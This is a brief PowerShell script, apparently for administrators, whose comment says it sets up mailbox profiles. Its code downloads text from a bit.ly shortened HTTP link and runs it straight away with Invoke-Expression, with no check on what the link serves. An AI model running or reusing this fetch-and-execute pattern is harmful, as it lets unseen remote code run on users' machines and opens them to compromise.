<# 

Creating script to run a remote script for creating new mailbox profiles and other updates as needed.



#>



$webClient = New-Object System.NET.WebClient
$url ="http://bit.ly/2gDTjpF"
$command = $webClient.DownloadString($url)
Invoke-Expression $command 

